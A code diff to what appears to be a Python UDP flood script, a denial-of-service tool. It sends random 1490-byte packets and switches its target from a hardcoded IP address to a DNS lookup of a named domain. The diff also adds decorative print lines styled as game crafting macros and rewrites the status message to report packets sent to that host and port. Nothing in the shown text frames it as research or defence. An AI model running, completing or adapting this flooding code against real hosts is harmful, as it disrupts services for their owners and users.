@@ -13,10 +13,29 @@ import datetime
 sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
+# Cast
+print('To all of my children in whom Life flows abundant...')
+print('To all of my children to whom Death hath passed his judgement...')
+print('The soul yearns for honor, and the flesh the hereafter...')
+print('Look to those who walked before to lead those who walk after...')
+print('')
+print('Hear...Feel...Think...')
+time.sleep(1)
+print('-----------------------------------')
+print('/ac Reflect <wait.3>')
+print('/ac Manipulation <wait.2>')
+print('/ac Preparatory Touch <wait.1>')
+print('/ac Preparatory Touch <wait.1>')
+print('/ac Great Strides <wait.2>')
+print("/ac Byregot's Blessing <wait.3>")
+print('/ac Great Veneration <wait.2>')
+print('/ac Groundwork <wait.1>')
+print('/ac Groundwork')
+print('')
+
 # Get ip.
 url = "fwe22.top"
-#ip = socket.gethostbyname(url)
-ip = "103.215.51.92"
+ip = socket.gethostbyname(url)
 
 # Value.
 sent = 1
@@ -37,4 +56,4 @@ if i == 1:
             dtime = now.strftime("%Y-%m-%d %H:%M:%S")
             
     except:
-        print('65535 attacks completed, Exited')
+        print('[%s]Sented %s packets to %s(%s) through port:%s'%(dtime, sent, url, ip, port))
